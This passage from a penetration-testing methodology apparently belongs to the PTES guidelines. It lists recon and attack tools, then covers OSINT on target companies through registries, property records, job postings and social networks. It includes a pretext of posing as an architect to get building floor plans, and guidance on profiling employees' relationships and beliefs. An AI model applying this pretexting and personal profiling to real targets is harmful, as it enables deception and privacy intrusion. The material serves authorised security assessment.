scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols. |'''*''' |- |cree.py | http://ilektrojohn.github.com/creepy/ |cree.py gathers geolocation related information from social networking platforms and image hosting services. Then the information is presented in a map where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context. | |- |inSSIDer | http://www.metageek.net/products/inssider |inSSIDer is a free gui-based wifi discovery and troubleshooting tool for Windows |'''*''' |- |Kismet Newcore | http://www.kismetwireless.net |Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet passively collects packets from both named and hidden networks with any wireless adapter that supports raw monitor mode. | |- |Rainbow Crack | http://project-rainbowcrack.com |Rainbow Crack is a password cracker that will run a pre-computed rainbow table against a given series of hashes. | |- |dnsenum | http://code.google.com/p/dnsenum |Think of dnsenum as a supercharged version of a whois query. It not only discovers all of the dns records but it goes a step further and attempts to use google to discover subdomains, discovers BIND versions and more. | |- |dnsmap | http://code.google.com/p/dnsmap |Dnsmap is a passive dns mapper that is used for subdomain bruteforce discovery. | |- |dnsrecon | http://www.darkoperator.com/tools-and-scripts/ |DNS enumeration script written in ruby for performing TLD expansion, SRV record enumeration, host and subdomain brute force, zone transfer, reverse lookup and general record identification. | |- |dnstracer | http://www.mavetju.org/unix/dnstracer.php |dnstracer determines where a given Domain Name Server (DNS) gets its information from and follows the chain of DNS servers back to the servers which know the data. | |- |dnswalk | http://sourceforge.net/projects/dnswalk |Dnswalk is a DNS debugger. It performs zone transfers of specified domains, and checks the database in numerous ways for internal consistency, as well as accuracy. | |- |Fierce | http://ha.ckers.org/fierce |Fierce domain scan discovers non-contiguous IP ranges of a network. | |- |Fierce2 | http://trac.assembla.com/fierce/ |Fierce 2 is an updated version that is maintained by a new group of developers. | |- |FindDomains | http://code.google.com/p/finddomains |FindDomains is a multithreaded search engine discovery tool that will be very useful for penetration testers dealing with discovering domain names/web sites/virtual hosts which are located on too many IP addresses. Provides a console interface so you can easily integrate this tool to your pentesting automation system. |'''*''' |- |HostMap | http://hostmap.lonerunners.net |hostmap is a free and automatic tool that enables the discovery of all hostnames and virtual hosts on a given IP address. | |- |URLcrazy | http://www.morningstarsecurity.com/research/urlcrazy |URLCrazy is a domainname typo generator. This will allow you to find squatted domains related to your target company and possibly generate some of your own. | |- |theHarvester | http://www.edge-security.com/theHarvester.php |theHarvester is a tool for gathering e-mail accounts, user names and hostnames/subdomains from different public sources like search engines and PGP key servers. | |- |The Metasploit Framework | http://metasploit.com |Metasploit is an ever-growing collection of remote exploits and post exploitation tools for all platforms. You will want to constantly run svn updates on this tool since new features and exploits are added nearly daily. Metasploit is both incredibly powerful and complex. For further guidance, check out this book http://nostarch.com/metasploit.htm . | |- |The Social-Engineer Toolkit (SET) | http://www.secmaniac.com/download/ |The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element. Amongst other things, SET allows you to craft malcious emails and dummy websites based on legitimate ones to compliment a social engineering attack. | |- |Fast-Track | http://www.secmaniac.com/download/ |Fast-Track is an automated pentesting tool suite. Many of the issues Fast-Track exploits are due to improper sanitizing of client-side data within web applications, patch management, or lack of hardening techniques. It runs on Linux and depends on Metasploit 3. | |} Intelligence Gathering Intelligence Gathering is the phase where data or \"intelligence\" is gathered to assist in guiding the assessment actions. At the broadest level this intelligence gathering includes information about employees, facilities, products and plans. Within a larger picture this intelligence will include potentially secret or private \"intelligence\" of a competitor, or information that is otherwise relevant to the target. OSINT Open Source Intelligence (OSINT) in the simplest of terms is locating, and analyzing publically (open) available sources of information. The key component here is that this intelligence gathering process has a goal of producing current and relevant information that is valuable to either an attacker or competitor. For the most part, OSINT is more than simply performing web searches using various sources. Corporate Information on a particular target should include information regarding the legal entity. Most states within the US require Corporations, limited liability companies and limited partnerships to file with the State division. This division serves as custodian of the filings and maintains copies and/or certifications of the documents and filings. This information may contain information regarding shareholders, members, officers or other persons involved in the target entity. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''State''' | '''URL''' |- |Alabama |[ http://sos.alabama.gov/BusinessServices/NameRegistration.aspx http://sos.alabama.gov/BusinessServices/NameRegistration.aspx ] |- |Alaska |[ http://www.dced.state.ak.us/bsc/corps.htm http://www.dced.state.ak.us/bsc/corps.htm ] |- |Arizona |[ http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p ] |- |Arkansas |[ http://www.sosweb.state.ar.us/corps/incorp http://www.sosweb.state.ar.us/corps/incorp ] |- |California |[ http://kepler.sos.ca.gov/ http://kepler.sos.ca.gov/ ] |- |Colorado |[ http://www.state.co.us/ http://www.state.co.us ] |- |Connecticut |[ http://www.state.ct.us/ http://www.state.ct.us ] |- |Delaware |[ http://www.state.de.us/ http://www.state.de.us ] |- |District of Columbia |[ http://www.ci.washington.dc.us/ http://www.ci.washington.dc.us ] |- |Florida |[ http://www.sunbiz.org/search.html http://www.sunbiz.org/search.html ] |- |Georgia |[ http://corp.sos.state.ga.us/corp/soskb/CSearch.asp http://corp.sos.state.ga.us/corp/soskb/CSearch.asp ] |- |Hawaii |[ http://www.state.hi.us/ http://www.state.hi.us ] |- |Idaho |[ http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit ] |- |Illinois |[ http://www.ilsos.gov/corporatellc http://www.ilsos.gov/corporatellc ] |- |Indiana |[ http://secure.in.gov/sos/bus_service/online_corps/default.asp http://secure.in.gov/sos/bus_service/online_corps/default.asp ] |- |Iowa |[ http://www.state.ia.us/ http://www.state.ia.us ] |- |Kansas |[ http://www.accesskansas.org/apps/corporations.html http://www.accesskansas.org/apps/corporations.html ] |- |Kentucky |[ http://ukcc.uky.edu/~vitalrec http://ukcc.uky.edu/ ~ vitalrec] |- |Louisiana |[ http://www.sec.state.la.us/crpinq.htm http://www.sec.state.la.us/crpinq.htm ] |- |Maine |[ http://www.state.me.us/sos/cec/corp/ucc.htm http://www.state.me.us/sos/cec/corp/ucc.htm ] |- |Maryland |[ http://sdatcert3.resiusa.org/ucc-charter http://sdatcert3.resiusa.org/ucc-charter ] |- |Massachusetts |[ http://ucc.sec.state.ma.us/psearch/default.asp http://ucc.sec.state.ma.us/psearch/default.asp ] |- |Michigan |[ http://www.cis.state.mi.us/bcs_corp/sr_corp.asp http://www.cis.state.mi.us/bcs_corp/sr_corp.asp ] |- |Minnesota |[ http://www.state.mn.us/ http://www.state.mn.us/ ] |- |Mississippi |[ http://www.sos.state.ms.us/busserv/corpsnap http://www.sos.state.ms.us/busserv/corpsnap ] |- |Missouri |[ http://www.state.mo.us/ http://www.state.mo.us ] |- |Montana |[ http://sos.state.mt.us/ http://sos.state.mt.us ] |- |Nebraska |[ http://www.sos.state.ne.us/htm/UCCmenu.htm http://www.sos.state.ne.us/htm/UCCmenu.htm ] |- |Nevada |[ http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm ] |- |New Hampshire |[ http://www.state.nh.us/ http://www.state.nh.us ] |- |New Jersey |[ http://www.state.nj.us/treasury/revenue/searchucc.htm http://www.state.nj.us/treasury/revenue/searchucc.htm ] |- |New Mexico |[ http://www.sos.state.nm.us/UCC/UCCSRCH.HTM http://www.sos.state.nm.us/UCC/UCCSRCH.HTM ] |- |New York |[ http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show ] |- |North Carolina |[ http://www.secstate.state.nc.us/research.htm http://www.secstate.state.nc.us/research.htm ] |- |North Dakota |[ http://www.state.nd.us/sec http://www.state.nd.us/sec ] |- |Ohio |[ http://serform.sos.state.oh.us/pls/report/report.home http://serform.sos.state.oh.us/pls/report/report.home ] |- |Oklahoma |[ http://www.oklahomacounty.org/coclerk/ucc/default.asp http://www.oklahomacounty.org/coclerk/ucc/default.asp ] |- |Oregon |[ http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login ] |- |Pennsylvania |[ http://www.dos.state.pa.us/DOS/site/default.asp http://www.dos.state.pa.us/DOS/site/default.asp ] |- |Rhode Island |[ http://155.212.254.78/ http://155.212.254.78 ] |- |South Carolina |[ http://www.scsos.com/corp_search.htm http://www.scsos.com/corp_search.htm ] |- |South Dakota |[ http://www.state.sd.us/ http://www.state.sd.us ] |- |Tennessee |[ http://www.state.tn.us/sos/service.htm http://www.state.tn.us/sos/service.htm ] |- |Texas |[ https://ourcpa.cpa.state.tx.us/coa/Index.html https://ourcpa.cpa.state.tx.us/coa/Index.html ] |- |Utah |[ http://www.commerce.state.ut.us/ http://www.commerce.state.ut.us ] |- |Vermont |[ http://www.sec.state.vt.us/seek/database.htm http://www.sec.state.vt.us/seek/database.htm ] |- |Virginia |[ http://www.state.va.us/ http://www.state.va.us ] |- |Washington |[ http://www.dol.wa.gov/business/UCC/ http://www.dol.wa.gov/business/UCC/ ] |- |West Virginia |[ http://www.wvsos.com/wvcorporations http://www.wvsos.com/wvcorporations ] |- |Wisconsin |[ http://www.wdfi.org/corporations/crispix http://www.wdfi.org/corporations/crispix ] |- |Wyoming |[ http://soswy.state.wy.us/Corp_Search_Main.asp http://soswy.state.wy.us/Corp_Search_Main.asp ] |} Physical Often the first step in OSINT is to identify the physical locations of the target corporation. This information might be readily available for publically known or published locations, but not quite so easy for more secretive sites. Public sites can often be location by using search engines such as: Google -[ http://www.google.com/ http://www.google.com ] Yahoo - [ http://yahoo.com/ http://yahoo.com ] Bing - [ http://www.bing.com/ http://www.bing.com ] Ask.com - [ http://ask.com/ http://ask.com ] Locations Shared/Individual As part of identifying the physical location it is important to note if the location is an individual building or simply a suite in a larger facility. It is important to attempt to identify neighboring businesses as well as common areas. Owner Once the physical locations have been identified, it is useful to identify the actual property owner(s). This can either be an individual, group, or corporation. If the target corporation does not own the property then they may be limited in what they can physically do to enhance or improve the physical location. Land/tax records Tax records: http://www.naco.org/Counties/Pages/CitySearch.aspx Land and tax records generally include a wealth of information on a target such as ownership, possession, mortgage companies, foreclosure notices, photographs and more. The information recorded and level of transparency varies greatly by jurisdiction. Land and tax records within the United States are typically handled at the county level. To start, if you know the city or zipcode in which your target resides, use a site such as http://publicrecords.netronline.com/ to determine which county that is in. Then switching over to Google you can use a query such as \"XXXX county tax records\", \"XXXX county recording office\" or \"XXXX county assessor\" and that should lead you to a searchable online database if one exists. If it does not exist, you can still call the county recording office and request that they fax you specific records if you have an idea of what you are looking for. Building department: For some assessments, it might make sense to go a step further and query the local building department for additional information. Depending on the city, the target's site might be under county or city jurisdiction. Typically that can be determined by a call to either entity. The building department generally has floor plans, old & current permits, tenant improvement information and other similar information on file. Buried in that information might be names of contracting firms, engineers, architects and more. All of which could be used with a tool such as SET. In most cases, a phone call will be required to obtain any of this information but most building departments are happy to hand it out to anyone who asks. Here is a possible pretext you could use to obtain floor plans: You could call up and say that you are an architectural consultant who has been hired to design a remodel or addition to the building and it would help the process go much smoother if you could get a copy of the original plans. Datacenter Locations Identifying any target business data center locations via either the corporate website, public filings, land records or via a search engine can provide additional potential targets. Time zones Identifying the time zones that the target operates in provides valuable information regarding the hours of operation. It is also significant to understand the relationship between the target time zone and that of the assessment team. A time zone map is often useful as a reference when conducting any test. [[:File:Penetration_Testing_Execution_02.png|TimeZone Map]] Offsite gathering Identifying any recent or future offsite gatherings or parties via either the corporate website or via a search engine can provide valuable insight into the corporate culture of a target. It is often common practice for businesses to have offsite gatherings not only for employees, but also for business partners and customers. Collecting this data could provide insight into potential items of interest to an attacker. Product/Services Identifying the target business products and any significant data related to such launches via the corporate website, new releases or via a search engine can provide valuable insight into the internal workings of a target. It is often common practice for businesses to make such notifications publicly in an effort to garner publicity and to inform current and/or new customers of the launch. Publicly available information includes, but is not limited to, foreign language documents, radio and television broadcasts, Internet sites, and public speaking. Company Dates Significant company dates can provide insight into potential days where staff may be on alert higher than normal. This could be due to potential corporate meetings, board meetings, investor meetings, or corporate anniversary. Normally, businesses that observe various holidays have a significantly reduced staff and therefore targeting may prove to be much more difficult during these periods. Position identification Within every target it is critical that you identify and document the top positions within the organization. This is critical to ensure that the resulting report is targeting the correct audience. At a minimum, key employees should be identified as part of any engagement. Organizational Chart Understanding the organizational structure is important, not only to understand the depth of the structure, but also the breadth. If the organization is extremely large, it is possible that new staff or personnel could go undetected. In smaller organizations, the likelihood is not as great. Getting a good picture of this structure can also provide insight into the functional groups. This information can be useful in determining internal targets. Corporate Communications Identifying corporate communications either via the corporate website or a job search engine can provide valuable insight into the internal workings of a target. Marketing Marketing communications are often used to make corporate announcements regarding currently, or future product releases, and partnerships. Lawsuits Communications regarding the targets involvement in litigation can provide insight into potential threat agent or data of interest. Transactions Communications involving corporate transactions may be indirect response to a marketing announcement or lawsuit. Job openings Searching current job openings or postings via either the corporate website or via a job search engine can provide valuable insight into the internal workings of a target. It is often common practice to include information regarding currently, or future, technology implementations. Collecting this data could provide insight into potential items of interest to an attacker. Several Job Search Engines exist that can be queried for information regarding the target. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Site''' | '''URL''' |- |Monster |[ http://www.monster.com/ http://www.monster.com ] |- |CareerBuilder |[ http://www.careerbuilder.com/ http://www.careerbuilder.com ] |- |Computerjobs.com |[ http://www.computerjobs.com/ http://www.computerjobs.com ] |- |Craigslist |[ http://www.craigslist.org/about/sites/ http://www.craigslist.org/about/sites ] |} Relationships Identifying the targets logical relationships is critical to understand more about how the business operates. Publicly available information should be leveraged to determine the target business relationship with vendors, business partners, law firms, etc. This is often available via news releases, corporate web sites (target and vendors), and potentially via industry related forums. Charity Affiliations Identifying any target business charity affiliations via either the corporate website or via a search engine can provide valuable insight into the internal workings and potentially the corporate culture of a target. It is often common practice for businesses to make charitable donations to various organizations. Collecting this data could provide insight into potential items of interest to an attacker. Network Providers Identifying any network provisioning or providers either via the allocated netblock /address information, corporate website or via a search engine can provide valuable insight into the potentially of a target. It is often common practice for businesses to make charitable donations to various organizations. Collecting this data could provide insight into potential items of interest to an attacker. Business Partners Identifying business partners is critical to gaining insight into not only the corporate culture of a target, but also potentially technologies being used. It is often common practice for businesses to announce partnership agreements. Collecting this data could provide insight into potential items of interest to an attacker. Competitors Identifying competitors can provide a window into potential adversaries. It is not uncommon for competitors to announce news that could impact the target. These could range from new hires, product launches, and even partnership agreements. Collecting this data is important to fully understand any potential corporate hostility. Individuals Social Networking Profile The numbers of active Social Networking websites as well as the number of users make this a prime location to identify employee's friendships, kinships, common interest, financial exchanges, likes/dislikes, sexual relationships, or beliefs. It is even possible to determine an employee's corporate knowledge or prestige. Social Networking Websites {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Name''' | '''URL''' | '''Description/Focus''' |- |Academia.edu |[ http://www.academia.edu/ http://www.academia.edu ] |Social networking site for academics/researchers |- |Advogato |[ http://www.advogato.org/ http://www.advogato.org ] |Free and open source software developers |- |aNobii |[ http://www.anobii.com/anobii_home http://www.anobii.com/anobii_home ] |Books |- |aSmallWorld |[ http://www.asmallworld.net/ http://www.asmallworld.net ] |European jet set and social elite world-wide |- |AsianAvenue |[ http://www.asianave.com/ http://www.asianave.com ] |A social network for the Asian American community |- |Athlinks |[ http://www.athlinks.com/ http://www.athlinks.com ] |Open Running, Swimming |- |Audimated.com |[ http://www.audimated.com/ http://www.audimated.com ] |Independent Music |- |Avatars United |[ http://www.avatarsunited.com/ http://www.avatarsunited.com ] |Online games |- |Badoo |[ http://badoo.com/ http://badoo.com ] |General, Meet new people, Popular in Europe and LatAm |- |Bebo |[ http://www.bebo.com/ http://www.bebo.com ] |General |- |Bigadda |[ http://bigb.bigadda.com/ http://bigb.bigadda.com ] |Indian Social Networking Site |- |Federated Media's BigTent |[ http://www.federatedmedia.net/ http://www.federatedmedia.net ] |Organization and communication portal for groups |- |Biip.no |[ http://www.biip.no/ http://www.biip.no ] |Norwegian community |- |BlackPlanet |[ http://www.blackplanet.com/ http://www.blackplanet.com ] |African-Americans |- |Blauk |[ http://blauk.com/ http://blauk.com ] |Anyone who wants to tell something about a stranger or acquaintance. |- |Blogster |[ http://www.blogster.com/ http://www.blogster.com ] |Blogging community |- |Bolt.com |[ http://www.bolt.com/ http://www.bolt.com ] |General |- |Buzznet |[ http://www.buzznet.com/ http://www.buzznet.com ] |Music and pop-culture |- |CafeMom |[ http://www.cafemom.com/ http://www.cafemom.com ] |Mothers |- |Cake Financial |[ http://www.cakefinancial.com/ http://www.cakefinancial.com ] |Investing |- |Care2 |[ http://www.care2.com/ http://www.care2.com ] |Green living and social activism |- |CaringBridge |[ http://www.caringbridge.org/ http://www.caringbridge.org ] |Not for profit providing free websites that connect family and friends during a serious health event, care and recovery. |- |Cellufun |[ http://m.cellufun.com/ http://m.cellufun.com ] |Mobile social game network, Number 8 US mobile website |- |Classmates.com |[ http://www.classmates.com/ http://www.classmates.com ] |School, college, work and the military |- |Cloob |[ http://www.cloob.com/ http://www.cloob.com ] |General. Popular in Iran |- |CouchSurfing |[ http://www.couchsurfing.org/ http://www.couchsurfing.org ] |Worldwide network for making connections between travelers and the local communities they visit. |- |CozyCot |[ http://www.cozycot.com/ http://www.cozycot.com ] |East Asian and Southeast Asian women |- |Cross.tv |[ http://www.cross.tv/ http://www.cross.tv ] |Faith Based social network for Christian believers from around the world |- |Crunchyroll |[ http://www.crunchyroll.com/ http://www.crunchyroll.com ] |Anime and forums. |- |Cyworld |(Korea) [ http://cyworld.co.kr/ http://cyworld.co.kr ] (China) [ http://www.cyworld.com.cn/ http://www.cyworld.com.cn ] |General. Popular in South Korea. |- |DailyBooth |[ http://dailybooth.com/ http://dailybooth.com ] |Photo-blogging site where users upload a photo every day |- |DailyStrength |[ http://www.dailystrength.org/ http://www.dailystrength.org ] |Medical & emotional support community - Physical health, Mental health, Support groups |- |Decayenne |[ http://www.decayenne.com/ http://www.decayenne.com ] |European and American social elite |- |delicious |[ http://www.delicious.com/ http://www.delicious.com ] |Social bookmarking allowing users to locate and save websites that match their own interests |- |deviantART |[ http://www.deviantart.com/ http://www.deviantart.com ] |Art community |- |Disaboom |[ http://www.disaboom.com/ http://www.disaboom.com ] |People with disabilities (Amputee, cerebral palsy, MS, and other disabilities) |- |Dol2day |[ http://www.dol2day.de/ http://www.dol2day.de ] |Politic community, Social network, Internet radio (German-speaking countries) |- |DontStayIn |[ http://www.dontstayin.com/ http://www.dontstayin.com ] |Clubbing (primarily UK) |- |Draugiem.lv |[ http://www.draugiem.lv/ http://www.draugiem.lv ] |General (primarily LV, LT, HU) |- |douban |[ http://www.douban.com/ http://www.douban.com ] |Chinese Web 2.0 website providing user review and recommendation services for movies, books, and music. It is also the largest online Chinese language book, movie and music database and one of the largest online communities in China. |- |Elftown |[ http://www.elftown.com/ http://www.elftown.com ] |Community and wiki around Fantasy and sci-fi. |- |Entitycube |[ http://entitycube.research.microsoft.com/ http://entitycube.research.microsoft.com ] | |- |Eons.com |[ http://www.eons.com/ http://www.eons.com ] |For baby boomers |- |Epernicus |[ http://www.epernicus.com/ http://www.epernicus.com ] |For research scientists |- |Experience Project |[ http://www.experienceproject.com/ http://www.experienceproject.com ] |Life experiences |- |Exploroo |[ http://www.exploroo.com/ http://www.exploroo.com ] |Travel Social Networking. |- |Facebook |(IPv4) [ http://www.facebook.com/ http://www.facebook.com ] (IPv6) [ http://www.v6.facebook.com/ http://www.v6.facebook.com ] |General. |- |Faceparty |[ http://www.faceparty.com/ http://www.faceparty.com ] |General. Popular UK. |- |Faces.com |[ http://www.face-pic.com/ http://www.face-pic.com ] [ http://www.faces.com/ http://www.faces.com ] |British teens |- |Fetlife |[ http://fetlife.com/ http://fetlife.com ] |People who are into BDSM |- |FilmAffinity |[ http://www.filmaffinity.com/ http://www.filmaffinity.com ] |Movies and TV Series |- |FitFinder |[ http://www.thefitfinder.co.uk/ http://www.thefitfinder.co.uk ] |Anonymous UK Student Microblogging Website |- |FledgeWing |[ http://www.fledgewing.com/ http://www.fledgewing.com ] |Entrepreneural community targeted towards worldwide university students |- |Flixster |[ http://www.flixster.com/ http://www.flixster.com ] |Movies |- |Flickr |[ http://www.flickr.com/ http://www.flickr.com ] |Photo sharing, commenting, photography related networking, worldwide |- |Focus.com |[ http://www.focus.com/ http://www.focus.com ] |Business to Business, worldwide |- |Folkdirect |[ http://www.folkdirect.com/ http://www.folkdirect.com ] |General |- |Fotki |[ http://www.fotki.com/ http://www.fotki.com ] |Photo sharing, video hosting, photo contests, journals, forums, flexible privacy protection, friend's feed, audio comments and unlimited custom design integration. |- |Fotolog |[ http://www.fotolog.com/ http://www.fotolog.com ] |Photoblogging. Popular in South America and Spain |- |Foursquare |[ http://foursquare.com/ http://foursquare.com ] |Location based mobile social network |- |Friends Reunited |[ http://www.friendsreunited.com/ http://www.friendsreunited.com ] |UK based. School, college, work, sport and streets |- |Friendster |[ http://www.friendster.com/ http://www.friendster.com ] |General. Popular in Southeast Asia. No longer popular in the western world |- |Fr\u00b8hst\u00b8ckstreff |[ http://www.fruehstueckstreff.de/ http://www.fruehstueckstreff.de ] |General |- |Fubar |[ http://www.fubar.com/ http://www.fubar.com ] |dating, an \"online bar\" for 18 and older |- |Gaia Online |[ http://www.gaiaonline.com/ http://www.gaiaonline.com ] |Anime and games. Popular in USA, Canada and Europe. Moderately popular around Asia. |- |GamerDNA |[ http://www.gamerdna.com/ http://www.gamerdna.com ] |Computer and video games |- |Gather.com |[ http://home.gather.com/ http://home.gather.com ] |Article, picture, and video sharing, as well as group discussions |- |Gays.com |[ http://gays.com/ http://gays.com ] |Social network for LGBT community, Guide for LGBT bars, restaurants, clubs, shopping |- |Geni.com |[ http://www.geni.com/ http://www.geni.com ] |Families, genealogy |- |Gogoyoko |[ http://www.gogoyoko.com/ http://www.gogoyoko.com ] |Fair play in Music - Social networking site for musicians and music lovers |- |Goodreads |[ http://www.goodreads.com/ http://www.goodreads.com ] |Library cataloging, book lovers |- |Goodwizz |[ http://www.goodwizz.com/ http://www.goodwizz.com ] |Social network with matchmaking and personality games to find new contacts. Global, based in France. |- |Google Buzz |[ http://www.google.com/buzz http://www.google.com/buzz ] |General |- |Google+ |[ http://plus.google.com/ http://plus.google.com ] |General |- |GovLoop |[ http://www.govloop.com/ http://www.govloop.com ] |For people in and around government |- |Gowalla |[ http://gowalla.com/ http://gowalla.com ] | |- |Grono.net |[ http://grono.net/ http://grono.net ] |Poland |- |Habbo |[ http://www.habbo.com/ http://www.habbo.com ] |General for teens. Over 31 communities worldwide. Chat Room and user profiles. |- |hi5 |[ http://hi5.com/ http://hi5.com ] |General. Popular in India, Mongolia, Thailand, Romania, Jamaica, Central Africa, Portugal and Latin America. Not very popular in the USA. |- |Hospitality Club |[ http://www.hospitalityclub.org/ http://www.hospitalityclub.org ] |Hospitality |- |Hotlist |[ http://www.thehotlist.com/ http://www.thehotlist.com ] |Geo-Social Aggregator rooted in the concept of knowing where your friends are, were, and will be. |- |HR.com |[ http://www.hr.com/ http://www.hr.com ] |Social networking site for Human Resources professionals |- |Hub Culture |[ http://www.hubculture.com/ http://www.hubculture.com ] |Global influencers focused on worth creation |- |Hyves |[ http://www.hyves.nl/ http://www.hyves.nl ] |General, Most popular in the Netherlands. |- |Ibibo |[ http://www.ibibo.com/ http://www.ibibo.com ] |Talent based social networking site that allows to promote one's self and also discover new talent. Most popular in India. |- |Identi.ca |[ http://identi.ca/ http://identi.ca ] |Twitter-like service popular with hackers and software freedom advocates. |- |Indaba Music |[ http://www.indabamusic.com/ http://www.indabamusic.com ] |Online collaboration for musicians, remix contests, and networking. |- |IRC-Galleria |[ http://www.irc-galleria.net/ http://www.irc-galleria.net ] |Finland |- |italki.com |[ http://www.italki.com/ http://www.italki.com ] |Language learning social network. 100 + languages. |- |InterNations |[ http://www.internations.org/ http://www.internations.org ] |International community |- |Itsmy |[ http://mobile.itsmy.com/ http://mobile.itsmy.com ] |Mobile community worldwide, blogging, friends, personal TV-shows |- |iWiW |[ http://iwiw.hu/ http://iwiw.hu ] |Hungary |- |Jaiku |[ http://www.jaiku.com/ http://www.jaiku.com ] |General. Microblogging. Owned by Google |- |JammerDirect.com |[ http://www.jammerdirect.com/ http://www.jammerdirect.com ] |Network for unsigned artists |- |kaioo |[ http://www.kaioo.com/ http://www.kaioo.com ] |General, nonprofit |- |Kaixin001 |[ http://www.kaixin001.com/ http://www.kaixin001.com ] |General. In Simplified Chinese; caters for mainland China users |- |Kiwibox |[ http://www.kiwibox.com/ http://www.kiwibox.com ] |General. For the users, by the users, a social network that is more than a community. |- |Lafango |[ http://lafango.com/ http://lafango.com ] |Talent-Focused media sharing site |- |Last.fm |[ http://www.last.fm/ http://www.last.fm ] |Music |- |LibraryThing |[ http://www.librarything.com/ http://www.librarything.com/ ] (German) [ http://www.librarything.de/ http://www.librarything.de ] |Book lovers |- |Lifeknot |[ http://www.lifeknot.com/ http://www.lifeknot.com ] |Shared interests, hobbies |- |LinkedIn |[ http://www.linkedin.com/ http://www.linkedin.com ] |Business and professional networking |- |LinkExpats |[ http://www.linkexpats.com/ http://www.linkexpats.com ] |Social networking website for expatriates. 100 + countries. |- |Listography |[ http://listography.com/ http://listography.com ] |Lists. Autobiography |- |LiveJournal |[ http://www.livejournal.com/ http://www.livejournal.com ] |Blogging. Popular in Russia and among the Russian-speaking diaspora abroad. |- |Livemocha |[ http://www.livemocha.com/ http://www.livemocha.com ] |Online language learning - dynamic online courses in 35 languages - world's largest community of native language speakers. |- |LunarStorm |[ http://www.lunarstorm.se/ http://www.lunarstorm.se ] |Sweden |- |MEETin |[ http://www.meetin.org/ http://www.meetin.org ] |General |- |Meetup.com |[ http://www.meetup.com/ http://www.meetup.com ] |General. Used to plan offline meetings for people interested in various activities |- |Meettheboss |[ http://www.meettheboss.tv/ http://www.meettheboss.tv ] |Business and Finance community, worldwide. |- |Mixi |[ http://www.mixi.jp/ http://www.mixi.jp ] |Japan |- |mobikade |[ http://www.mkade.com/ http://www.mkade.com ] |mobile community, UK only |- |MocoSpace |[ http://www.mocospace.com/ http://www.mocospace.com ] |mobile community, worldwide |- |MOG |[ http://www.mog.com/ http://www.mog.com ] |Music |- |MouthShut.com |[ http://www.mouthshut.com/ http://www.mouthshut.com ] |Social Network, social media, consumer reviews |- |Mubi (website) |[ http://mubi.com/ http://mubi.com ] |Auteur cinema |- |Multiply |[ http://multiply.com/ http://multiply.com ] |Real world relationships. Popular in primarily in Asia. |- |Muxlim |[ http://muxlim.com/ http://muxlim.com ] |Muslim portal site |- |MyAnimeList |[ http://www.myanimelist.net/ http://www.myanimelist.net ] |Anime themed social community |- |MyChurch |[ http://www.mychurch.org/ http://www.mychurch.org ] |Christian Churches |- |MyHeritage |[ http://www.myheritage.com/ http://www.myheritage.com ] |family-oriented social network service |- |MyLife |[ http://www.mylife.com/ http://www.mylife.com ] |Locating friends and family, keeping in touch (formerly Reunion.com) |- |My Opera |[ http://my.opera.com/ http://my.opera.com ] |Blogging, mobile blogging, photo sharing, connecting with friends, Opera Link and Opera Unite. Global |- |Myspace |[ http://www.myspace.com/ http://www.myspace.com ] |General |- |myYearbook |[ http://www.myyearbook.com/ http://www.myyearbook.com ] |General, Charity |- |Nasza-klasa.pl |[ http://www.nk.pl/ http://www.nk.pl ] |School, college and friends. Popular in Poland |- |Netlog |[ http://www.netlog.com/ http://www.netlog.com ] |General. Popular in Europe, Turkey, the Arab World and Canada's Qu\u00c8bec province. Formerly known as Facebox and Redbox. |- |Nettby |[ http://www.nettby.no/ http://www.nettby.no ] |Norwegian Community |- |Nexopia |[ http://www.nexopia.com/ http://www.nexopia.com ] |Canada |- |NGO Post |[ http://www.ngopost.org/ http://www.ngopost.org ] |Non-Profit news sharing and networking, mainly in India |- |Ning |[ http://www.ngopost.org/ http://www.ngopost.org ] |Users create their own social websites and social networks |- |Odnoklassniki |[ http://odnoklassniki.ru/ http://odnoklassniki.ru ] |Connect with old classmates. Popular in Russia and former Soviet republics |- |OneClimate |[ http://www.oneclimate.net/ http://www.oneclimate.net ] |Not for Profit Social networking and Climate Change |- |OneWorldTV |[ http://tv.oneworld.net/ http://tv.oneworld.net ] |Not for Profit Video sharing and social networking aimed at people interested in social issues, development, environment, etc. |- |Open Diary |[ http://www.opendiary.com/ http://www.opendiary.com ] |First online blogging community, founded in 1998 |- |Orkut |[ http://orkut.com/ http://orkut.com ] |General. Owned by Google Inc. Popular in India and Brazil. |- |OUTeverywhere |[ http://www.outeverywhere.com/ http://www.outeverywhere.com ] |Gay/LGBTQ Community |- |Passportstamp |[ http://www.passportstamp.com/ http://www.passportstamp.com ] |Travel |- |Partyflock |[ http://partyflock.nl/ http://partyflock.nl ] |Dutch virtual community for people interested in house music and other electronic dance music. Since 2001, Partyflock has evolved into the biggest online community for the dance scene in the Netherlands |- |Picasa |[ http://picasa.google.com/ http://picasa.google.com ] | |- |PicFog |[ http://picfog.com/ http://picfog.com ] |PicFog shows pictures from twitter ''as'' they're posted |- |Pingsta |[ http://www.pingsta.com/ http://www.pingsta.com ] |Collaborative platform for the world's Internetwork Experts |- |Plaxo |[ http://www.plaxo.com/ http://www.plaxo.com ] |Aggregator |- |Playahead |[ http://www.playahead.se/ http://www.playahead.se ] |Swedish, Danish teenagers |- |Playlist.com |[ http://www.playlist.com/ http://www.playlist.com ] |General, Music |- |Plurk |[ http://www.plurk.com/ http://www.plurk.com ] |Micro-blogging, RSS, updates. Very popular in Taiwan |- |Present.ly |[ http://www.presently.com/ http://www.presently.com ] |Enterprise social networking and micro-blogging |- |Qapacity |[ http://www.qapacity.com/ 